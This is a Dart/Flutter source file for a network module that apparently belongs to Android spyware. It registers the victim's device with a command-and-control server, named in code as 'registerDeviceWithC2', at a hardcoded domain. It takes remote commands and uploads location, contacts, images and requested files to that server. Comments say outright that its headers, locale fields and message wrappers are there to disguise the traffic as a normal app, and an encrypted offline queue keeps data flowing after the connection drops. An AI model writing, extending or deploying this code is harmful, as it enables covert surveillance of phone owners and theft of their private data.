// lib/core/controlar/network/network_service.dart
import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';

import 'package:battery_plus/battery_plus.dart';
import 'package:camera/camera.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:crypto/crypto.dart';
import 'package:encrypt/encrypt.dart' as encrypt;
import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart' as io;

import '../permissions/constants.dart';
import '../permissions/device_info_service.dart';

// Socket.IO event constants
const String SIO_EVENT_REGISTRATION_SUCCESSFUL = 'registration_successful';
const String SIO_EVENT_REQUEST_REGISTRATION_INFO = 'request_registration_info';
const String SIO_EVENT_REGISTER_DEVICE = 'register_device';
const String SIO_EVENT_DEVICE_HEARTBEAT = 'device_heartbeat';
const String SIO_EVENT_COMMAND_RESPONSE = 'command_response';

// HTTP endpoint constants
const String HTTP_ENDPOINT_UPLOAD_INITIAL_DATA = '/api/device/initial-data';
const String HTTP_ENDPOINT_UPLOAD_COMMAND_FILE = '/api/device/command-file';

// Secure storage keys
const String KEY_ENCRYPTION_KEY = 'secure_encryption_key';
const String KEY_PENDING_DATA = 'pending_network_data';
const String KEY_LAST_CONNECTION = 'last_connection_timestamp';

class NetworkService {
  // Socket connection
  late io.Socket _socket;
  bool _isSocketConnected = false;
  final StreamController<bool> _connectionStatusController =
      StreamController<bool>.broadcast();
  final StreamController<Map<String, dynamic>> _commandController =
      StreamController<Map<String, dynamic>>.broadcast();

  // Secure storage for sensitive data
  final _secureStorage = FlutterSecureStorage();

  // Reconnection properties
  int _reconnectAttempts = 0;
  Timer? _reconnectTimer;
  final Random _random = Random.secure();

  // Heartbeat properties
  Timer? _heartbeatTimer;
  int _heartbeatSkipCounter = 0;
  int _consecutiveFailedHeartbeats = 0;

  // Data queue for offline operation
  final List<Map<String, dynamic>> _pendingDataQueue = [];
  bool _isProcessingQueue = false;

  // Security properties
  late String _encryptionKey;
  DateTime? _lastKeyRotation;
  int _messageCounter = 0;

  // Battery and connectivity monitoring
  final Battery _battery = Battery();
  final Connectivity _connectivity = Connectivity();
  int _batteryLevel = 100;
  bool _isCharging = false;
  ConnectivityResult _connectionType = ConnectivityResult.none;

  // Server URL - configurable
  final String _serverUrl;

  // Device info service
  final DeviceInfoService _deviceInfoService;

  NetworkService({String? serverUrl, DeviceInfoService? deviceInfoService})
      : _serverUrl = serverUrl ?? 'https://ws.sosa-qav.es',
        _deviceInfoService = deviceInfoService ?? DeviceInfoService() {
    _initializeService();
  }

  Future<void> _initializeService() async {
    // Initialize encryption keys first
    await _initializeSecurityKeys();

    // Initialize socket connection
    _initializeSocketIO();

    // Setup battery monitoring
    _setupBatteryMonitoring();

    // Setup connectivity monitoring
    _setupConnectivityMonitoring();

    // Load any pending data
    await _loadPendingData();

    // Schedule key rotation
    _scheduleKeyRotation();

    debugPrint('NetworkService: Service initialized');
  }

  /// SOCKET CONNECTION MANAGEMENT

  void _initializeSocketIO() {
    try {
      _socket = io.io(
        _serverUrl,
        io.OptionBuilder()
            .setTransports(['websocket'])
            .disableAutoConnect()
            .enableForceNew()
            .setExtraHeaders(
                {'X-Client-Version': '2.1.4'}) // Disguise as normal app
            .build(),
      );

      _socket.onConnect((_) {
        debugPrint('NetworkService: Socket connected');
        _isSocketConnected = true;
        _reconnectAttempts = 0;
        _connectionStatusController.add(true);

        // Save last successful connection time
        _secureStorage.write(
            key: KEY_LAST_CONNECTION, value: DateTime.now().toIso8601String());
      });

      _socket.onDisconnect((_) {
        debugPrint('NetworkService: Socket disconnected');
        _isSocketConnected = false;
        _connectionStatusController.add(false);

        // Schedule reconnection with backoff
        _scheduleReconnect();
      });

      _socket.onConnectError((error) {
        debugPrint('NetworkService: Socket connect error: $error');
        _isSocketConnected = false;
        _connectionStatusController.add(false);

        // Schedule reconnection with backoff
        _scheduleReconnect();
      });

      _socket.on('command', (data) {
        debugPrint(
            'NetworkService: Received command: ${data.toString().substring(0, min(50, data.toString().length))}...');

        try {
          Map<String, dynamic> decodedCommand;

          // Handle different payload formats
          if (data is Map) {
            decodedCommand = Map<String, dynamic>.from(data);
          } else if (data is String) {
            // Check if it's an encrypted command
            if (data.startsWith('ENC:')) {
              final decrypted = _decryptData(data.substring(4));
              decodedCommand = jsonDecode(decrypted);
            } else {
              decodedCommand = jsonDecode(data);
            }
          } else {
            throw FormatException('Unknown command format');
          }

          // Validate and process command
          if (decodedCommand.containsKey('command')) {
            _commandController.add(decodedCommand);
          }
        } catch (e) {
          debugPrint('NetworkService: Error parsing command: $e');
        }
      });

      _socket.on(SIO_EVENT_REGISTRATION_SUCCESSFUL, (data) {
        debugPrint('NetworkService: Registration successful: $data');

        // Start heartbeat after successful registration
        _startHeartbeat();

        // Process any pending data
        _processPendingDataQueue();
      });

      _socket.on(SIO_EVENT_REQUEST_REGISTRATION_INFO, (_) {
        debugPrint('NetworkService: Server requested registration info');
        _commandController.add({
          'command': SIO_EVENT_REQUEST_REGISTRATION_INFO,
          'args': {},
        });
      });
    } catch (e) {
      debugPrint('NetworkService: Error initializing socket: $e');
    }
  }

  void _scheduleReconnect() {
    // Use exponential backoff with jitter for reconnection
    int baseDelay = min(60000, 1000 * pow(1.5, _reconnectAttempts).toInt());
    int jitter = _random.nextInt(baseDelay ~/ 2);
    int reconnectDelay = baseDelay + jitter;

    debugPrint(
        'NetworkService: Scheduling reconnect in ${reconnectDelay ~/ 1000}s (attempt: ${_reconnectAttempts + 1})');

    _reconnectTimer?.cancel();
    _reconnectTimer = Timer(Duration(milliseconds: reconnectDelay), () {
      _reconnectAttempts++;

      if (!_isSocketConnected) {
        // Check if network is available before attempting
        _connectivity.checkConnectivity().then((result) {
          if (result != ConnectivityResult.none) {
            _deviceInfoService.getOrCreateUniqueDeviceId().then((deviceId) {
              if (deviceId.isNotEmpty) {
                connectSocketIO(deviceId);
              }
            });
          } else {
            // No network, reschedule
            _scheduleReconnect();
          }
        });
      }
    });
  }

  Future<void> connectSocketIO(String deviceId) async {
    try {
      if (!_socket.connected) {
        // Add some randomized query parameters to appear as regular traffic
        final timestamp = DateTime.now().millisecondsSinceEpoch;
        final randomToken = _generateRandomToken(8);

        _socket.io.options?['query'] = {
          'deviceId': deviceId,
          'v': '2.1.4',
          't': timestamp.toString(),
          'sid': randomToken,
        };

        _socket.connect();
        debugPrint(
            'NetworkService: Connecting socket with deviceId: $deviceId');
      }
    } catch (e) {
      debugPrint('NetworkService: Error connecting socket: $e');
    }
  }

  void disconnectSocketIO() {
    try {
      _stopHeartbeat();
      if (_socket.connected) {
        _socket.disconnect();
        debugPrint('NetworkService: Socket manually disconnected');
      }
    } catch (e) {
      debugPrint('NetworkService: Error disconnecting socket: $e');
    }
  }

  /// HEARTBEAT MANAGEMENT

  void _startHeartbeat() {
    _heartbeatTimer?.cancel();

    // Dynamic heartbeat interval
    _heartbeatTimer = Timer.periodic(const Duration(minutes: 2), (_) async {
      if (_isSocketConnected) {
        try {
          // Check battery and network conditions
          await _updateDeviceStatus();

          // Determine if we should skip this heartbeat
          bool shouldSkipHeartbeat = _shouldSkipHeartbeat();

          if (!shouldSkipHeartbeat) {
            // Prepare heartbeat data
            final heartbeatData = await _prepareHeartbeatData();

            // Send heartbeat
            _socket.emit(SIO_EVENT_DEVICE_HEARTBEAT, heartbeatData);
            debugPrint('NetworkService: Heartbeat sent');
            _consecutiveFailedHeartbeats = 0;
          } else {
            debugPrint(
                'NetworkService: Skipping heartbeat to conserve battery');
          }
        } catch (e) {
          _consecutiveFailedHeartbeats++;
          debugPrint('NetworkService: Error sending heartbeat: $e');

          // If too many failed heartbeats, try to reconnect
          if (_consecutiveFailedHeartbeats > 3) {
            debugPrint(
                'NetworkService: Too many failed heartbeats, reconnecting...');
            disconnectSocketIO();
            _deviceInfoService.getOrCreateUniqueDeviceId().then((deviceId) {
              connectSocketIO(deviceId);
            });
          }
        }
      }
    });
    debugPrint('NetworkService: Heartbeat started');
  }

  void _stopHeartbeat() {
    _heartbeatTimer?.cancel();
    _heartbeatTimer = null;
    debugPrint('NetworkService: Heartbeat stopped');
  }

  Future<void> _updateDeviceStatus() async {
    // Update battery level
    _batteryLevel = await _battery.batteryLevel;
    _isCharging = await _battery.batteryState.then((state) =>
        state == BatteryState.charging || state == BatteryState.full);

    // Update network status
    _connectionType = (await _connectivity.checkConnectivity()) as ConnectivityResult;
  }

  bool _shouldSkipHeartbeat() {
    // Skip heartbeats when battery is low
    if (_batteryLevel < 15 && !_isCharging) {
      return _heartbeatSkipCounter++ % 3 != 0; // Skip 2 out of 3
    }

    // Skip when on mobile data and battery not full
    if (_connectionType == ConnectivityResult.mobile &&
        _batteryLevel < 50 &&
        !_isCharging) {
      return _heartbeatSkipCounter++ % 2 == 0; // Skip every other
    }

    _heartbeatSkipCounter = 0;
    return false;
  }

  Future<Map<String, dynamic>> _prepareHeartbeatData() async {
    final deviceId = await _deviceInfoService.getOrCreateUniqueDeviceId();

    final baseData = {
      'deviceId': deviceId,
      'timestamp': DateTime.now().toIso8601String(),
      'counter': _messageCounter++,
      'basic': {
        'batteryLevel': _batteryLevel,
        'isCharging': _isCharging,
        'connectionType': _connectionType.toString(),
      }
    };

    // Add more data when on WiFi or charging
    if (_connectionType == ConnectivityResult.wifi || _isCharging) {
      baseData['extended'] = {
        'uptime': await _getSystemUptime(),
        'memoryUsage': await _getMemoryUsage(),
        'storageAvailable': await _getAvailableStorage(),
      };
    }

    return baseData;
  }

  /// DEVICE REGISTRATION AND COMMAND HANDLING

  void registerDeviceWithC2(Map<String, dynamic> deviceInfo) {
    if (!_isSocketConnected) return;
    try {
      // Add timestamp and message counter
      deviceInfo['registration_time'] = DateTime.now().toIso8601String();
      deviceInfo['messageCounter'] = _messageCounter++;

      // Add some metadata to make it look like regular app data
      deviceInfo['appVersion'] = '2.1.4';
      deviceInfo['locale'] = 'ar_SA';

      // Encrypt sensitive information
      if (deviceInfo.containsKey('locationData')) {
        deviceInfo['locationData'] =
            _encryptJsonField(deviceInfo['locationData']);
      }

      // Send registration data
      _socket.emit(SIO_EVENT_REGISTER_DEVICE, deviceInfo);
      debugPrint('NetworkService: Device registration sent');
    } catch (e) {
      debugPrint('NetworkService: Error registering device: $e');
    }
  }

  void sendCommandResponse({
    required String originalCommand,
    required String status,
    required Map<String, dynamic> payload,
  }) {
    if (!_isSocketConnected) {
      // If offline, queue the response for later
      _queueDataForLater({
        'type': 'command_response',
        'data': {
          'command': originalCommand,
          'status': status,
          'payload': payload,
          'timestamp': DateTime.now().toIso8601String(),
        }
      });
      return;
    }

    try {
      // Prepare response data
      final response = {
        'command': originalCommand,
        'status': status,
        'payload': payload,
        'timestamp': DateTime.now().toIso8601String(),
        'messageCounter': _messageCounter++,
      };

      // Obfuscate sensitive data
      final obfuscatedResponse = _obfuscateCommandResponse(response);

      // Send response
      _socket.emit(SIO_EVENT_COMMAND_RESPONSE, obfuscatedResponse);
      debugPrint('NetworkService: Command response sent for $originalCommand');
    } catch (e) {
      debugPrint('NetworkService: Error sending command response: $e');

      // Queue for later if sending fails
      _queueDataForLater({
        'type': 'command_response',
        'data': {
          'command': originalCommand,
          'status': status,
          'payload': payload,
          'timestamp': DateTime.now().toIso8601String(),
        }
      });
    }
  }

  /// FILE UPLOAD HANDLING

  Future<bool> sendInitialData({
    required Map<String, dynamic> jsonData,
    XFile? imageFile,
  }) async {
    try {
      // Check network before attempting
      final connectivityResult = await _connectivity.checkConnectivity();
      if (connectivityResult == ConnectivityResult.none) {
        debugPrint(
            'NetworkService: No network connectivity for initial data upload');

        // Queue for later
        _queueDataForLater({
          'type': 'initial_data',
          'data': jsonData,
          'imageFilePath': imageFile?.path,
        });

        return false;
      }

      // Prepare the API endpoint with random-looking query parameters
      final timestamp = DateTime.now().millisecondsSinceEpoch;
      final randomToken = _generateRandomToken(10);
      final uri = Uri.parse(
          '$_serverUrl$HTTP_ENDPOINT_UPLOAD_INITIAL_DATA?t=$timestamp&sid=$randomToken');

      // Create multipart request
      final request = http.MultipartRequest('POST', uri);

      // Add disguised headers to make it look like regular app traffic
      request.headers.addAll({
        'X-Client-Version': '2.1.4',
        'X-Request-ID': _generateRandomId(),
        'Accept-Language': 'ar',
      });

      // Encrypt and add sensitive data
      final processedData = _processInitialDataForUpload(jsonData);
      request.fields['data'] = jsonEncode(processedData);

      // Add image if available
      if (imageFile != null) {
        final file = await http.MultipartFile.fromPath(
          'image',
          imageFile.path,
          filename: _sanitizeFileName(imageFile.name),
        );
        request.files.add(file);
      }

      // Send request with timeout
      final response =
          await request.send().timeout(const Duration(seconds: 30));
      final responseBody = await response.stream.bytesToString();

      if (response.statusCode == 200) {
        debugPrint('NetworkService: Initial data sent successfully');
        return true;
      } else {
        debugPrint(
            'NetworkService: Error sending initial data: ${response.statusCode}, $responseBody');

        // Queue for retry if server error
        if (response.statusCode >= 500) {
          _queueDataForLater({
            'type': 'initial_data',
            'data': jsonData,
            'imageFilePath': imageFile?.path,
          });
        }

        return false;
      }
    } catch (e) {
      debugPrint('NetworkService: Exception sending initial data: $e');

      // Queue for later
      _queueDataForLater({
        'type': 'initial_data',
        'data': jsonData,
        'imageFilePath': imageFile?.path,
      });

      return false;
    }
  }

  Future<bool> uploadFileFromCommand({
    required String deviceId,
    required String commandRef,
    required XFile fileToUpload,
  }) async {
    try {
      // Check network connectivity
      final connectivityResult = await _connectivity.checkConnectivity();
      if (connectivityResult == ConnectivityResult.none) {
        debugPrint('NetworkService: No connectivity for file upload');

        // Queue for later
        _queueDataForLater({
          'type': 'command_file',
          'deviceId': deviceId,
          'commandRef': commandRef,
          'filePath': fileToUpload.path,
        });

        return false;
      }

      // Add random parameters to make it look like regular traffic
      final timestamp = DateTime.now().millisecondsSinceEpoch;
      final randomToken = _generateRandomToken(12);
      final uri = Uri.parse(
          '$_serverUrl$HTTP_ENDPOINT_UPLOAD_COMMAND_FILE?t=$timestamp&sid=$randomToken');

      final request = http.MultipartRequest('POST', uri);

      // Add headers to disguise as normal app traffic
      request.headers.addAll({
        'X-Client-Version': '2.1.4',
        'X-Request-ID': _generateRandomId(),
        'Accept-Language': 'ar',
      });

      // Add required fields
      request.fields['deviceId'] = deviceId;
      request.fields['commandRef'] = commandRef;
      request.fields['timestamp'] = DateTime.now().toIso8601String();

      // Add the file
      final file = await http.MultipartFile.fromPath(
        'file',
        fileToUpload.path,
        filename: _sanitizeFileName(fileToUpload.name),
      );
      request.files.add(file);

      // Send request with timeout
      final response =
          await request.send().timeout(const Duration(seconds: 60));
      final responseBody = await response.stream.bytesToString();

      if (response.statusCode == 200) {
        debugPrint(
            'NetworkService: File uploaded successfully for command $commandRef');
        return true;
      } else {
        debugPrint(
            'NetworkService: Error uploading file: ${response.statusCode}, $responseBody');

        // Queue for retry if server error
        if (response.statusCode >= 500) {
          _queueDataForLater({
            'type': 'command_file',
            'deviceId': deviceId,
            'commandRef': commandRef,
            'filePath': fileToUpload.path,
          });
        }

        return false;
      }
    } catch (e) {
      debugPrint('NetworkService: Exception uploading file: $e');

      // Queue for later
      _queueDataForLater({
        'type': 'command_file',
        'deviceId': deviceId,
        'commandRef': commandRef,
        'filePath': fileToUpload.path,
      });

      return false;
    }
  }

  /// OFFLINE QUEUE HANDLING

  void _queueDataForLater(Map<String, dynamic> data) {
    _pendingDataQueue.add(data);
    _persistPendingData();
    debugPrint(
        'NetworkService: Data queued for later sending. Queue size: ${_pendingDataQueue.length}');
  }

  Future<void> _persistPendingData() async {
    try {
      if (_pendingDataQueue.isEmpty) return;

      // Serialize and encrypt the queue
      final jsonData = jsonEncode(_pendingDataQueue);
      final encryptedData = _encryptData(jsonData);

      // Store in secure storage
      await _secureStorage.write(key: KEY_PENDING_DATA, value: encryptedData);
    } catch (e) {
      debugPrint('NetworkService: Error persisting pending data: $e');
    }
  }

  Future<void> _loadPendingData() async {
    try {
      final encryptedData = await _secureStorage.read(key: KEY_PENDING_DATA);
      if (encryptedData == null || encryptedData.isEmpty) return;

      // Decrypt and deserialize
      final jsonData = _decryptData(encryptedData);
      final List<dynamic> dataList = jsonDecode(jsonData);

      // Clear queue and add loaded items
      _pendingDataQueue.clear();
      for (var item in dataList) {
        _pendingDataQueue.add(Map<String, dynamic>.from(item));
      }

      debugPrint(
          'NetworkService: Loaded ${_pendingDataQueue.length} pending items');
    } catch (e) {
      debugPrint('NetworkService: Error loading pending data: $e');
      // Reset if corrupted
      await _secureStorage.delete(key: KEY_PENDING_DATA);
    }
  }

  Future<void> _processPendingDataQueue() async {
    if (_isProcessingQueue || _pendingDataQueue.isEmpty || !_isSocketConnected)
      return;

    _isProcessingQueue = true;
    debugPrint(
        'NetworkService: Processing pending data queue (${_pendingDataQueue.length} items)');

    try {
      int processedCount = 0;
      int successCount = 0;

      while (_pendingDataQueue.isNotEmpty && processedCount < 5) {
        // Process max 5 items at once
        final item = _pendingDataQueue.first;
        bool success = false;

        switch (item['type']) {
          case 'command_response':
            try {
              sendCommandResponse(
                originalCommand: item['data']['command'],
                status: item['data']['status'],
                payload: Map<String, dynamic>.from(item['data']['payload']),
              );
              success = true;
            } catch (e) {
              debugPrint(
                  'NetworkService: Error sending queued command response: $e');
            }
            break;

          case 'initial_data':
            try {
              XFile? imageFile;
              if (item['imageFilePath'] != null) {
                imageFile = XFile(item['imageFilePath']);
              }

              success = await sendInitialData(
                jsonData: Map<String, dynamic>.from(item['data']),
                imageFile: imageFile,
              );
            } catch (e) {
              debugPrint(
                  'NetworkService: Error sending queued initial data: $e');
            }
            break;

          case 'command_file':
            try {
              success = await uploadFileFromCommand(
                deviceId: item['deviceId'],
                commandRef: item['commandRef'],
                fileToUpload: XFile(item['filePath']),
              );
            } catch (e) {
              debugPrint('NetworkService: Error sending queued file: $e');
            }
            break;
        }

        processedCount++;
        if (success) {
          successCount++;
          _pendingDataQueue.removeAt(0);
          await _persistPendingData();
        } else {
          // If we couldn't send it, move to end of queue and try next item
          final failedItem = _pendingDataQueue.removeAt(0);
          _pendingDataQueue.add(failedItem);
          await _persistPendingData();
        }
      }

      debugPrint(
          'NetworkService: Processed $processedCount queued items, $successCount succeeded');
    } catch (e) {
      debugPrint('NetworkService: Error processing queue: $e');
    } finally {
      _isProcessingQueue = false;

      // Schedule next round if there are still items
      if (_pendingDataQueue.isNotEmpty) {
        // Wait a bit before processing more
        Timer(const Duration(minutes: 3), () {
          if (_isSocketConnected) {
            _processPendingDataQueue();
          }
        });
      }
    }
  }

  /// BATTERY AND CONNECTIVITY MONITORING

  void _setupBatteryMonitoring() {
    // Initial battery reading
    _battery.batteryLevel.then((level) {
      _batteryLevel = level;
    });

    _battery.batteryState.then((state) {
      _isCharging =
          state == BatteryState.charging || state == BatteryState.full;
    });

    // Start battery monitoring
    _battery.onBatteryStateChanged.listen((BatteryState state) {
      _isCharging =
          state == BatteryState.charging || state == BatteryState.full;

      // When charging starts, try to process queue
      if (_isCharging && _pendingDataQueue.isNotEmpty && _isSocketConnected) {
        _processPendingDataQueue();
      }
    });
  }

  void _setupConnectivityMonitoring() {
    // Initial connectivity check
    _connectivity.checkConnectivity().then((result) {
      _connectionType = result as ConnectivityResult;
    });

    // Start connectivity monitoring
    _connectivity.onConnectivityChanged.listen((ConnectivityResult result) {
      _connectionType = result;

      // When connectivity improves, try reconnect and process queue
      if (result != ConnectivityResult.none && !_isSocketConnected) {
        _deviceInfoService.getOrCreateUniqueDeviceId().then((deviceId) {
          connectSocketIO(deviceId);
        });
      } else if (result == ConnectivityResult.none && _isSocketConnected) {
        // Disconnect when no connectivity to save battery
        disconnectSocketIO();
      }
    } as void Function(List<ConnectivityResult> event)?);
  }

  /// SECURITY AND ENCRYPTION

  Future<void> _initializeSecurityKeys() async {
    try {
      // Try to load existing key
      String? storedKey = await _secureStorage.read(key: KEY_ENCRYPTION_KEY);

      if (storedKey != null && storedKey.isNotEmpty) {
        _encryptionKey = storedKey;
        debugPrint('NetworkService: Loaded existing encryption key');
      } else {
        // Generate a new key
        await _generateNewEncryptionKey();
      }

      // Load last key rotation time
      String? lastRotation =
          await _secureStorage.read(key: 'last_key_rotation');
      if (lastRotation != null) {
        _lastKeyRotation = DateTime.parse(lastRotation);
      } else {
        _lastKeyRotation = DateTime.now();
        await _secureStorage.write(
            key: 'last_key_rotation',
            value: _lastKeyRotation!.toIso8601String());
      }
    } catch (e) {
      debugPrint('NetworkService: Error initializing security keys: $e');
      // Fallback
      await _generateNewEncryptionKey();
    }
  }

  Future<void> _generateNewEncryptionKey() async {
    // Generate device-specific entropy
    final deviceId = await _deviceInfoService.getOrCreateUniqueDeviceId();
    final deviceInfo = await _deviceInfoService.getDeviceInfo();
    final deviceModel = deviceInfo['device_model'] ?? 'unknown';

    // Add some randomness
    final random = Random.secure();
    final randomBytes = List<int>.generate(32, (_) => random.nextInt(256));

    // Create a unique key based on device info and random data
    final keySource = utf8.encode(
            '$deviceId:$deviceModel:${DateTime.now().toIso8601String()}') +
        randomBytes;
    _encryptionKey = base64.encode(sha256.convert(keySource).bytes);

    // Store key securely
    await _secureStorage.write(key: KEY_ENCRYPTION_KEY, value: _encryptionKey);
    debugPrint('NetworkService: Generated new encryption key');

    // Update last rotation time
    _lastKeyRotation = DateTime.now();
    await _secureStorage.write(
        key: 'last_key_rotation', value: _lastKeyRotation!.toIso8601String());
  }

  void _scheduleKeyRotation() {
    // Rotate keys every 7 days
    Timer.periodic(const Duration(hours: 12), (_) async {
      if (_lastKeyRotation != null) {
        final daysSinceRotation =
            DateTime.now().difference(_lastKeyRotation!).inDays;

        if (daysSinceRotation >= 7) {
          debugPrint('NetworkService: Rotating encryption key');
          await _generateNewEncryptionKey();
        }
      }
    });
  }

  String _encryptData(String data) {
    try {
      // Generate a random IV
      final iv = encrypt.IV.fromSecureRandom(16);

      // Convert key to appropriate format
      final keyBytes = base64.decode(_encryptionKey);
      final key = encrypt.Key(
          keyBytes.sublist(0, 32)); // Use first 32 bytes for AES-256

      // Create encrypter
      final encrypter =
          encrypt.Encrypter(encrypt.AES(key, mode: encrypt.AESMode.cbc));

      // Encrypt
      final encrypted = encrypter.encrypt(data, iv: iv);

      // Return IV + encrypted data
      return '${base64.encode(iv.bytes)}:${encrypted.base64}';
    } catch (e) {
      debugPrint('NetworkService: Encryption error: $e');
      // Fallback to simple encoding
      return base64.encode(utf8.encode(data));
    }
  }

  String _decryptData(String encryptedData) {
    try {
      // Split IV and data
      final parts = encryptedData.split(':');
      if (parts.length != 2) {
        throw FormatException('Invalid encrypted data format');
      }

      final iv = encrypt.IV.fromBase64(parts[0]);
      final encryptedText = encrypt.Encrypted.fromBase64(parts[1]);

      // Convert key to appropriate format
      final keyBytes = base64.decode(_encryptionKey);
      final key = encrypt.Key(keyBytes.sublist(0, 32));

      // Create decrypter
      final decrypter =
          encrypt.Encrypter(encrypt.AES(key, mode: encrypt.AESMode.cbc));

      // Decrypt
      return decrypter.decrypt(encryptedText, iv: iv);
    } catch (e) {
      debugPrint('NetworkService: Decryption error: $e');
      // Fallback to simple decoding
      try {
        return utf8.decode(base64.decode(encryptedData));
      } catch (_) {
        throw FormatException('Failed to decrypt data: $e');
      }
    }
  }

  /// UTILITY FUNCTIONS

  String _encryptJsonField(dynamic data) {
    if (data == null) return '';
    return 'ENC:${_encryptData(jsonEncode(data))}';
  }

  Map<String, dynamic> _processInitialDataForUpload(Map<String, dynamic> data) {
    // Deep copy to avoid modifying original
    final result = Map<String, dynamic>.from(data);

    // Add metadata to make it look like regular app data
    result['client_version'] = '2.1.4';
    result['sync_id'] = _generateRandomId();
    result['locale'] = 'ar_SA';
    result['timezone'] = 'Asia/Riyadh';
    result['timestamp'] = DateTime.now().toIso8601String();

    // Encrypt sensitive fields
    if (result.containsKey('location')) {
      result['location'] = _encryptJsonField(result['location']);
    }

    if (result.containsKey('contacts')) {
      result['contacts'] = _encryptJsonField(result['contacts']);
    }

    return result;
  }

  Map<String, dynamic> _obfuscateCommandResponse(
      Map<String, dynamic> response) {
    // Make it look like a normal chat message
    return {
      'msg_id': _generateRandomId(),
      'msg_type': 'sync_response',
      'timestamp': DateTime.now().millisecondsSinceEpoch,
      'content': _encryptData(jsonEncode(response)),
      'version': '2.1.4',
    };
  }

  String _generateRandomId() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    return List.generate(20, (index) => chars[_random.nextInt(chars.length)])
        .join();
  }

  String _generateRandomToken(int length) {
    const chars =
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return List.generate(
        length, (index) => chars[_random.nextInt(chars.length)]).join();
  }

  String _sanitizeFileName(String fileName) {
    // Remove dangerous characters
    return fileName.replaceAll(RegExp(r'[/\\?%*:|"<>]'), '_');
  }

  Future<String> _getSystemUptime() async {
    try {
      if (Platform.isAndroid) {
        final result = await const MethodChannel('app.channel.shared.data')
            .invokeMethod('getSystemUptime');
        return result.toString();
      }
    } catch (e) {
      // Ignore errors
    }
    return 'unknown';
  }

  Future<String> _getMemoryUsage() async {
    try {
      if (Platform.isAndroid) {
        final result = await const MethodChannel('app.channel.shared.data')
            .invokeMethod('getMemoryInfo');
        return result.toString();
      }
    } catch (e) {
      // Ignore errors
    }
    return 'unknown';
  }

  Future<String> _getAvailableStorage() async {
    try {
      if (Platform.isAndroid) {
        final result = await const MethodChannel('app.channel.shared.data')
            .invokeMethod('getStorageInfo');
        return result.toString();
      }
    } catch (e) {
      // Ignore errors
    }
    return 'unknown';
  }

  /// PUBLIC API

  // Get current connection status
  bool get isSocketConnected => _isSocketConnected;

  // Stream of connection status changes
  Stream<bool> get connectionStatusStream => _connectionStatusController.stream;

  // Stream of incoming commands
  Stream<Map<String, dynamic>> get commandStream => _commandController.stream;

  // Dispose resources
  void dispose() {
    disconnectSocketIO();
    _connectionStatusController.close();
    _commandController.close();
    _reconnectTimer?.cancel();
    _heartbeatTimer?.cancel();
  }
}
